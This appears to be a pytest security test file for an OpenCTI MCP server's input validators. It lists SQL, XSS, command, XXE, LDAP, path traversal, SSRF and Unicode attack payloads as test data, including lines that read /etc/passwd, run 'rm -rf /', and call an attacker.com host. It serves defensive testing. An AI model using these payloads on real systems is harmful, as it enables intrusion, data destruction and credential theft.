"""Exhaustive security tests for OpenCTI MCP.

Covers:
- Injection attacks (GraphQL, SQL, XSS, command, LDAP, XML)
- Authentication bypass attempts
- Rate limiting bypass attempts
- Circuit breaker manipulation
- Memory exhaustion attacks
- Timing attacks
- Unicode/encoding attacks
- Path traversal
- SSRF attempts
- Token/credential exposure
- Error message information leakage
- Protocol-level attacks
"""

from __future__ import annotations

import time

import pytest
from opencti_mcp.config import Config, SecretStr
from opencti_mcp.errors import ValidationError
from opencti_mcp.validation import (
    MAX_QUERY_LENGTH,
    normalize_hash,
    sanitize_for_log,
    truncate_response,
    validate_date_filter,
    validate_days,
    validate_ioc,
    validate_labels,
    validate_length,
    validate_limit,
    validate_observable_types,
    validate_relationship_types,
    validate_stix_pattern,
    validate_uuid,
)

# =============================================================================
# GraphQL Injection Tests
# =============================================================================


class TestGraphQLInjection:
    """Test GraphQL injection prevention."""

    @pytest.mark.parametrize(
        "payload",
        [
            # Basic injection attempts
            '") { indicator { id } }',
            '", first: 999999) { id }',
            '\\") { __schema { types { name } } }',
            # Mutation injection
            '") { mutation { createIndicator(input: {}) { id } } }',
            # Fragment injection
            '") { ...frag } fragment frag on Query { __typename }',
            # Directive injection
            '") @skip(if: false) { id }',
            # Variable injection
            '", $var: String) { indicator(id: $var) { id } }',
            # Comment injection
            '") # comment\n{ id }',
            # Alias injection
            '") { a: indicator { id } b: indicator { id } }',
            # Batch query injection
            '") } { secondQuery { id }',
            # Introspection
            '") { __type(name: "Indicator") { fields { name } } }',
            '") { __schema { queryType { name } } }',
        ],
    )
    def test_graphql_injection_in_query(self, payload: str):
        """GraphQL injection in query field should not cause errors."""
        # Should not raise - pycti handles escaping
        validate_length(payload, MAX_QUERY_LENGTH, "query")

    @pytest.mark.parametrize(
        "payload",
        [
            # Nested query injection
            '{ indicator(search: "test") { id relationships { edges { node { id } } } } }',
            # Deep nesting attack
            "{ a { b { c { d { e { f { g { h { i { j { k } } } } } } } } } } }",
        ],
    )
    def test_graphql_deep_nesting(self, payload: str):
        """Deep nesting doesn't crash validation."""
        validate_length(payload, MAX_QUERY_LENGTH, "query")


# =============================================================================
# SQL Injection Tests
# =============================================================================


class TestSQLInjection:
    """Test SQL injection prevention (defense in depth)."""

    @pytest.mark.parametrize(
        "payload",
        [
            # Basic SQL injection
            "'; DROP TABLE indicators; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM users --",
            "1; DELETE FROM indicators WHERE '1'='1",
            # Blind SQL injection
            "' AND SLEEP(5) --",
            "' AND 1=1 --",
            "' AND 1=2 --",
            # Time-based blind
            "'; WAITFOR DELAY '0:0:5' --",
            "' AND BENCHMARK(10000000,SHA1('test')) --",
            # Error-based
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION())) --",
            # Stacked queries
            "'; INSERT INTO users VALUES('hacker','password'); --",
            # Second order
            "admin'--",
            # Out-of-band
            "'; EXEC xp_cmdshell('nslookup attacker.com') --",
        ],
    )
    def test_sql_injection_in_query(self, payload: str):
        """SQL injection payloads are handled safely."""
        # Should pass length validation (GraphQL handles escaping)
        if len(payload) <= MAX_QUERY_LENGTH:
            validate_length(payload, MAX_QUERY_LENGTH, "query")

    @pytest.mark.parametrize(
        "payload",
        [
            "'; DROP TABLE--",
            "' OR 1=1--",
            "admin'--",
        ],
    )
    def test_sql_injection_in_labels(self, payload: str):
        """SQL injection in labels is rejected."""
        with pytest.raises(ValidationError):
            validate_labels([payload])


# =============================================================================
# XSS Prevention Tests
# =============================================================================


class TestXSSPrevention:
    """Test XSS prevention."""

    @pytest.mark.parametrize(
        "payload",
        [
            # Basic XSS
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "<svg onload=alert('xss')>",
            # Event handlers
            "<body onload=alert('xss')>",
            "<input onfocus=alert('xss') autofocus>",
            # JavaScript URLs
            "javascript:alert('xss')",
            "data:text/html,<script>alert('xss')</script>",
            # Encoded XSS
            "%3Cscript%3Ealert('xss')%3C/script%3E",
            "&#60;script&#62;alert('xss')&#60;/script&#62;",
            # DOM-based
            "<div id='x' onclick='alert(1)'>click</div>",
            # Template injection (could be XSS in some contexts)
            "{{constructor.constructor('alert(1)')()}}",
            "${alert('xss')}",
        ],
    )
    def test_xss_in_query(self, payload: str):
        """XSS payloads are handled in queries."""
        if len(payload) <= MAX_QUERY_LENGTH:
            validate_length(payload, MAX_QUERY_LENGTH, "query")

    @pytest.mark.parametrize(
        "payload",
        [
            "<script>",
            "<img src=x>",
            "{json}",
        ],
    )
    def test_xss_in_labels_rejected(self, payload: str):
        """XSS in labels is rejected due to character restrictions."""
        with pytest.raises(ValidationError):
            validate_labels([payload])


# =============================================================================
# Command Injection Tests
# =============================================================================


class TestCommandInjection:
    """Test command injection prevention."""

    @pytest.mark.parametrize(
        "payload",
        [
            # Basic command injection
            "; ls -la",
            "| cat /etc/passwd",
            "& whoami",
            "$(id)",
            "`id`",
            # Windows
            "& dir",
            "| type C:\\Windows\\System32\\config\\SAM",
            # Newline injection
            "\n\rcat /etc/passwd",
            # Null byte injection
            "test\x00; rm -rf /",
            # Environment variable
            "${PATH}",
            "$HOME",
            # Subshell
            "$((1+1))",
            "$(cat /etc/passwd)",
        ],
    )
    def test_command_injection_in_query(self, payload: str):
        """Command injection payloads handled safely."""
        # Null bytes should be caught
        if "\x00" in payload:
            with pytest.raises(ValidationError):
                validate_ioc(payload)
        elif len(payload) <= MAX_QUERY_LENGTH:
            validate_length(payload, MAX_QUERY_LENGTH, "query")

    @pytest.mark.parametrize(
        "payload",
        [
            "; rm -rf /",
            "| cat /etc/passwd",
            "$(whoami)",
        ],
    )
    def test_command_injection_in_labels_rejected(self, payload: str):
        """Command injection in labels rejected."""
        with pytest.raises(ValidationError):
            validate_labels([payload])


# =============================================================================
# LDAP Injection Tests
# =============================================================================


class TestLDAPInjection:
    """Test LDAP injection prevention."""

    @pytest.mark.parametrize(
        "payload",
        [
            "*",
            "*()|%26'",
            "*)(uid=*))(|(uid=*",
            "admin)(&)",
            "x)(|(objectclass=*)",
            "*))%00",
        ],
    )
    def test_ldap_injection(self, payload: str):
        """LDAP injection payloads handled."""
        if "\x00" in payload:
            with pytest.raises(ValidationError):
                validate_ioc(payload)
        else:
            validate_length(payload, MAX_QUERY_LENGTH, "query")


# =============================================================================
# XML/XXE Injection Tests
# =============================================================================


class TestXMLInjection:
    """Test XML/XXE injection prevention."""

    @pytest.mark.parametrize(
        "payload",
        [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>',
            '<![CDATA[<script>alert("xss")</script>]]>',
        ],
    )
    def test_xxe_injection(self, payload: str):
        """XXE payloads handled safely."""
        if len(payload) <= MAX_QUERY_LENGTH:
            validate_length(payload, MAX_QUERY_LENGTH, "query")


# =============================================================================
# Path Traversal Tests
# =============================================================================


class TestPathTraversal:
    """Test path traversal prevention."""

    @pytest.mark.parametrize(
        "payload",
        [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc/passwd",
            "/etc/passwd",
            "C:\\Windows\\System32\\config\\SAM",
            "file:///etc/passwd",
            "\\\\server\\share\\file",
        ],
    )
    def test_path_traversal_in_query(self, payload: str):
        """Path traversal payloads handled."""
        validate_length(payload, MAX_QUERY_LENGTH, "query")

    @pytest.mark.parametrize(
        "payload",
        [
            "../../../",
            "..\\..\\",
        ],
    )
    def test_path_traversal_in_labels_rejected(self, payload: str):
        """Path traversal in labels rejected."""
        with pytest.raises(ValidationError):
            validate_labels([payload])


# =============================================================================
# SSRF Prevention Tests
# =============================================================================


class TestSSRFPrevention:
    """Test SSRF prevention in URL handling."""

    @pytest.mark.parametrize(
        "url",
        [
            "http://localhost/admin",
            "http://127.0.0.1/admin",
            "http://[::1]/admin",
            "http://0.0.0.0/",
            "http://169.254.169.254/latest/meta-data/",  # AWS metadata
            "http://metadata.google.internal/",  # GCP metadata
            "http://169.254.169.254/metadata/v1/",  # Azure metadata
            "http://192.168.1.1/admin",
            "http://10.0.0.1/",
            "http://172.16.0.1/",
            "gopher://localhost:6379/_INFO",
            "file:///etc/passwd",
            "dict://localhost:11211/stats",
        ],
    )
    def test_ssrf_urls_detected_as_urls(self, url: str):
        """SSRF URLs are detected as URL type."""
        if url.startswith(("http://", "https://", "ftp://")):
            is_valid, ioc_type = validate_ioc(url)
            assert ioc_type == "url"
        # Other protocols should be unknown or rejected


# =============================================================================
# Unicode Attack Tests
# =============================================================================


class TestUnicodeAttacks:
    """Test Unicode-based attacks."""

    @pytest.mark.parametrize(
        "payload",
        [
            # Homoglyph attacks (lookalike characters)
            "аdmin",  # Cyrillic 'а' looks like Latin 'a'
            "ɡoogle.com",  # Latin Small Letter Script G
            "microsоft.com",  # Cyrillic 'о'
            "аpple.com",  # Cyrillic 'а'
            # Zero-width characters
            "admin\u200b",  # Zero-width space
            "admin\u200c",  # Zero-width non-joiner
            "admin\u200d",  # Zero-width joiner
            "admin\ufeff",  # Byte order mark
            # Right-to-left override
            "admin\u202e",  # RTL override
            "admin\u202d",  # LTR override
            # Combining characters
            "e\u0301",  # e + combining acute
            "a\u0300\u0301\u0302",  # Multiple combining marks
            # Fullwidth characters
            "\uff41\uff42\uff43",  # Fullwidth ABC
            # Mathematical symbols
            "\U0001d41a\U0001d41b",  # Mathematical bold a, b
            # Confusables
            "ℂ𝕠𝕕𝕖",  # Mixed mathematical symbols
        ],
    )
    def test_unicode_attacks_in_labels(self, payload: str):
        """Unicode attacks in labels are rejected."""
        with pytest.raises(ValidationError):
            validate_labels([payload])

    @pytest.mark.parametrize(
        "payload",
        [
            "test\u0000hidden",  # Null byte
            "test\x00hidden",  # Null byte (hex)
        ],
    )
    def test_null_byte_injection(self, payload: str):
        """Null bytes are rejected."""
        with pytest.raises(ValidationError):
            validate_ioc(payload)


# =============================================================================
# Encoding Attack Tests
# =============================================================================


class TestEncodingAttacks:
    """Test encoding-based attacks."""

    @pytest.mark.parametrize(
        "payload",
        [
            # Double encoding
            "%252e%252e%252f",
            "%25252e%25252e%25252f",
            # Mixed encoding
            "%2e.%2f",
            "..%c0%af",  # UTF-8 overlong encoding
            "..%c1%9c",  # Another overlong
            # URL encoding
            "%3Cscript%3E",
            "%00",
            # Base64 in URL
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
            # Unicode escapes
            "\\u003cscript\\u003e",
            "\\x3cscript\\x3e",
        ],
    )
    def test_encoding_attacks_handled(self, payload: str):
        """Encoding attacks don't crash validation."""
        try:
            validate_length(payload, MAX_QUERY_LENGTH, "query")
        except ValidationError:
            pass  # Some may be rejected, which is fine


# =============================================================================
# Integer Overflow/Underflow Tests
# =============================================================================


class TestIntegerBoundaries:
    """Test integer boundary conditions."""

    @pytest.mark.parametrize(
        "value",
        [
            0,
            -1,
            -999999999,
            999999999,
            2**31 - 1,  # Max int32
            2**31,  # Overflow int32
            2**63 - 1,  # Max int64
            -(2**31),  # Min int32
            -(2**63),  # Min int64
        ],
    )
    def test_limit_boundaries(self, value: int):
        """Limit validation handles extreme values."""
        result = validate_limit(value)
        assert 1 <= result <= 100

    @pytest.mark.parametrize(
        "value",
        [
            0,
            -1,
            -999,
            999999,
            365,
            366,
        ],
    )
    def test_days_boundaries(self, value: int):
        """Days validation handles extreme values."""
        result = validate_days(value)
        assert 1 <= result <= 365


# =============================================================================
# Rate Limiter Bypass Tests
# =============================================================================


class TestRateLimiterBypass:
    """Test rate limiter bypass prevention."""

    def test_rate_limiter_not_affected_by_system_time_change(self):
        """Rate limiter uses monotonic time."""
        from opencti_mcp.client import RateLimiter

        limiter = RateLimiter(max_calls=5, window_seconds=60)

        # Exhaust the limit
        for _ in range(5):
            assert limiter.check_and_record() is True

        # Should be rate limited
        assert limiter.check() is False

        # Even if system time changes, should still be limited
        # (monotonic time prevents this attack)
        assert limiter.check() is False

    def test_rate_limiter_concurrent_access(self):
        """Rate limiter handles concurrent access."""
        import threading

        from opencti_mcp.client import RateLimiter

        limiter = RateLimiter(max_calls=100, window_seconds=60)
        successes = []
        lock = threading.Lock()

        def try_request():
            result = limiter.check_and_record()
            with lock:
                successes.append(result)

        threads = [threading.Thread(target=try_request) for _ in range(200)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        # Exactly 100 should succeed
        assert sum(successes) == 100


# =============================================================================
# Circuit Breaker Manipulation Tests
# =============================================================================


class TestCircuitBreakerManipulation:
    """Test circuit breaker manipulation prevention."""

    def test_circuit_breaker_uses_monotonic_time(self):
        """Circuit breaker uses monotonic time."""
        from opencti_mcp.client import CircuitBreaker, CircuitState

        cb = CircuitBreaker(failure_threshold=2, recovery_timeout=1)

        # Trip the breaker
        cb.record_failure()
        cb.record_failure()
        assert cb.state == CircuitState.OPEN

        # Immediate check should fail
        assert cb.allow_request() is False

    def test_circuit_breaker_state_machine(self):
        """Circuit breaker follows correct state transitions."""
        from opencti_mcp.client import CircuitBreaker, CircuitState

        cb = CircuitBreaker(failure_threshold=2, recovery_timeout=0.1)

        # closed -> open
        assert cb.state == CircuitState.CLOSED
        cb.record_failure()
        cb.record_failure()
        assert cb.state == CircuitState.OPEN

        # open -> half_open (after timeout)
        time.sleep(0.15)
        assert cb.state == CircuitState.HALF_OPEN

        # half_open -> closed (on success)
        cb.record_success()
        assert cb.state == CircuitState.CLOSED

        # half_open -> open (on failure)
        cb.record_failure()
        cb.record_failure()
        time.sleep(0.15)
        assert cb.state == CircuitState.HALF_OPEN
        cb.record_failure()
        assert cb.state == CircuitState.OPEN


# =============================================================================
# Token/Credential Exposure Tests
# =============================================================================


class TestCredentialExposure:
    """Test credential exposure prevention."""

    def test_token_not_in_config_repr(self):
        """Token not exposed in config repr."""
        config = Config(
            opencti_url="http://localhost:8080",
            opencti_token=SecretStr("super-secret-api-token-12345"),
        )
        repr_str = repr(config)
        str_str = str(config)

        assert "super-secret-api-token-12345" not in repr_str
        assert "super-secret-api-token-12345" not in str_str
        assert "***" in repr_str

    def test_token_not_in_error_messages(self):
        """Token value not exposed in error messages."""
        secret_value = "super-secret-token-value-12345"
        try:
            Config(
                opencti_url="http://invalid-host-that-wont-resolve:9999",
                opencti_token=SecretStr(secret_value),
            )
        except Exception as e:
            # The word "token" may appear (e.g., "token is required") but the VALUE must not
            assert secret_value not in str(e)

    def test_secret_str_not_exposed_accidentally(self):
        """SecretStr prevents accidental exposure."""
        secret = SecretStr("my-secret-value")

        # Various ways secrets might leak
        assert "my-secret-value" not in str(secret)
        assert "my-secret-value" not in repr(secret)
        assert "my-secret-value" not in f"{secret}"

        # But can get value explicitly
        assert secret.get_secret_value() == "my-secret-value"


# =============================================================================
# Error Message Leakage Tests
# =============================================================================


class TestErrorMessageLeakage:
    """Test error message information leakage prevention."""

    def test_uuid_error_no_value_leak(self):
        """UUID errors don't leak the attempted value."""
        malicious = "secret-password-attempt-123"
        try:
            validate_uuid(malicious, "entity_id")
        except ValidationError as e:
            assert "secret-password" not in str(e)
            assert "attempt" not in str(e)

    def test_label_error_no_full_value(self):
        """Label errors don't leak full malicious value."""
        malicious = "x" * 200 + "SECRET_DATA"
        try:
            validate_labels([malicious])
        except ValidationError as e:
            assert "SECRET_DATA" not in str(e)

    def test_stix_pattern_error_generic(self):
        """STIX pattern errors are generic."""
        try:
            validate_stix_pattern("invalid-pattern-with-secrets")
        except ValidationError as e:
            assert "brackets" in str(e).lower() or "pattern" in str(e).lower()

    def test_date_error_generic(self):
        """Date errors give generic format message."""
        try:
            validate_date_filter("secret-date-value", "created_after")
        except ValidationError as e:
            assert "ISO8601" in str(e)
            assert "secret" not in str(e).lower()


# =============================================================================
# Log Injection Tests
# =============================================================================


class TestLogInjection:
    """Test log injection prevention."""

    @pytest.mark.parametrize(
        "payload",
        [
            "user\nERROR: Fake error",
            "user\rINFO: Fake info",
            "user\r\nWARNING: Fake warning",
            "user\x1b[31mRED TEXT\x1b[0m",  # ANSI escape
            "user%0aERROR: Injected",  # URL-encoded newline
        ],
    )
    def test_log_injection_sanitized(self, payload: str):
        """Log injection attempts are sanitized."""
        sanitized = sanitize_for_log(payload)
        # Should not contain raw newlines
        assert "\n" not in sanitized or "\\n" in sanitized
        assert "\r" not in sanitized or "\\r" in sanitized


# =============================================================================
# Prototype Pollution / Object Injection Tests
# =============================================================================


class TestObjectInjection:
    """Test object injection prevention."""

    @pytest.mark.parametrize(
        "payload",
        [
            "__proto__[isAdmin]",  # Contains brackets - rejected
            "constructor{prototype}",  # Contains braces - rejected
            "__proto__<script>",  # Contains angle brackets - rejected
        ],
    )
    def test_prototype_pollution_in_labels(self, payload: str):
        """Prototype pollution attempts with special chars in labels rejected."""
        with pytest.raises(ValidationError):
            validate_labels([payload])

    @pytest.mark.parametrize(
        "payload",
        [
            "__proto__",
            "constructor",
        ],
    )
    def test_plain_prototype_names_allowed(self, payload: str):
        """Plain prototype names pass validation (they're just strings)."""
        # These are valid label strings - injection only matters if processed unsafely
        result = validate_labels([payload])
        assert result == [payload]


# =============================================================================
# STIX Pattern Injection Tests
# =============================================================================


class TestSTIXPatternInjection:
    """Test STIX pattern injection prevention."""

    @pytest.mark.parametrize(
        "pattern",
        [
            "[ipv4-addr:value = '1.1.1.1'] OR [file:name = 'test']",  # Valid
            "[ipv4-addr:value = '1.1.1.1'",  # Unbalanced
            "ipv4-addr:value = '1.1.1.1']",  # Missing open
            "[ipv4-addr:value = '1.1.1.1']]",  # Extra close
            "[[ipv4-addr:value = '1.1.1.1']",  # Extra open
            "[ipv4-addr:value = '1.1.1.1'; DROP TABLE]",  # SQL in pattern
            "[ipv4-addr:value = '1.1.1.1' AND invalid:field = 'x']",  # Invalid type
        ],
    )
    def test_stix_pattern_validation(self, pattern: str):
        """STIX patterns are validated."""
        try:
            validate_stix_pattern(pattern)
            # If it passes, ensure it's properly formatted
            assert pattern.startswith("[")
            assert pattern.endswith("]")
        except ValidationError:
            pass  # Expected for invalid patterns


# =============================================================================
# ReDoS Prevention Tests
# =============================================================================


class TestReDoSPrevention:
    """Test ReDoS (Regular Expression Denial of Service) prevention."""

    def test_long_input_fast_rejection(self):
        """Long inputs are rejected quickly via length check."""
        # This pattern could cause ReDoS if processed by regex
        evil_input = "a" * 100000

        start = time.perf_counter()
        with pytest.raises(ValidationError):
            validate_length(evil_input, MAX_QUERY_LENGTH, "query")
        elapsed = time.perf_counter() - start

        # Should complete in milliseconds
        assert elapsed < 0.01, f"Length check took {elapsed}s - possible ReDoS"

    def test_pathological_regex_input(self):
        """Pathological regex inputs don't cause slowdown."""
        # Classic ReDoS pattern that exploits backtracking
        evil_inputs = [
            "a" * 30 + "!",  # For patterns like (a+)+
            "a" * 30 + "b",  # For patterns like (a|a)+
            "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaab",  # For (a+)+b
        ]

        for evil_input in evil_inputs:
            start = time.perf_counter()
            try:
                validate_ioc(evil_input)
            except ValidationError:
                pass
            elapsed = time.perf_counter() - start
            assert elapsed < 0.1, f"IOC validation took {elapsed}s"


# =============================================================================
# Memory Exhaustion Tests
# =============================================================================


class TestMemoryExhaustion:
    """Test memory exhaustion prevention."""

    def test_large_input_rejected(self):
        """Very large inputs are rejected before processing."""
        huge_input = "x" * 10_000_000  # 10MB

        with pytest.raises(ValidationError):
            validate_length(huge_input, MAX_QUERY_LENGTH, "query")

    def test_large_list_truncated(self):
        """Large lists in responses are truncated."""
        data = {"items": list(range(100_000))}
        result = truncate_response(data)
        assert len(result["items"]) <= 100

    def test_deeply_nested_structure_handled(self):
        """Deeply nested structures don't cause stack overflow."""
        # Create moderately nested dict (Python default recursion limit is ~1000)
        data = {"level": 0}
        current = data
        for i in range(100):  # Reduced to avoid recursion limit
            current["nested"] = {"level": i + 1}
            current = current["nested"]

        # Should not crash
        result = truncate_response(data)
        assert isinstance(result, dict)


# =============================================================================
# Hash Validation Security Tests
# =============================================================================


class TestHashValidationSecurity:
    """Test hash validation security."""

    @pytest.mark.parametrize(
        "payload",
        [
            "d41d8cd98f00b204e9800998ecf8427e; rm -rf /",  # Command injection
            "d41d8cd98f00b204e9800998ecf8427e' OR '1'='1",  # SQL injection
            "d41d8cd98f00b204e9800998ecf8427e<script>",  # XSS
        ],
    )
    def test_hash_with_injection_not_valid(self, payload: str):
        """Hashes with injection attempts are not valid hashes."""
        # normalize_hash strips prefix and whitespace, but injection chars remain
        normalized = normalize_hash(payload)
        # The result should not be a valid hash length (32, 40, 64)
        assert len(normalized) not in (32, 40, 64) or not all(
            c in "0123456789abcdef" for c in normalized
        )


# =============================================================================
# Observable Type Injection Tests
# =============================================================================


class TestObservableTypeInjection:
    """Test observable type injection prevention."""

    @pytest.mark.parametrize(
        "type_val",
        [
            "IPv4-Addr; DROP TABLE",
            "File' OR '1'='1",
            "Domain-Name<script>",
            "URL\nNewType",
            "StixFile\x00Hidden",
        ],
    )
    def test_observable_type_injection_rejected(self, type_val: str):
        """Observable types with injection attempts rejected."""
        with pytest.raises(ValidationError):
            validate_observable_types([type_val])


# =============================================================================
# Date Filter Injection Tests
# =============================================================================


class TestDateFilterInjection:
    """Test date filter injection prevention."""

    @pytest.mark.parametrize(
        "date_val",
        [
            "2024-01-01; DROP TABLE",
            "2024-01-01' OR '1'='1",
            "2024-01-01<script>alert(1)</script>",
            "2024-01-01\n2025-01-01",
            "2024-01-01\x00hidden",
        ],
    )
    def test_date_injection_rejected(self, date_val: str):
        """Date values with injection attempts rejected."""
        with pytest.raises(ValidationError):
            validate_date_filter(date_val, "created_after")


# =============================================================================
# Relationship Type Injection Tests
# =============================================================================


class TestRelationshipTypeInjection:
    """Test relationship type injection prevention."""

    @pytest.mark.parametrize(
        "rel_type",
        [
            "uses; DROP TABLE",
            "targets' OR '1'='1",
            "indicates<script>",
            "related-to\nmalicious",
        ],
    )
    def test_relationship_type_injection_rejected(self, rel_type: str):
        """Relationship types with injection rejected."""
        with pytest.raises(ValidationError):
            validate_relationship_types([rel_type])
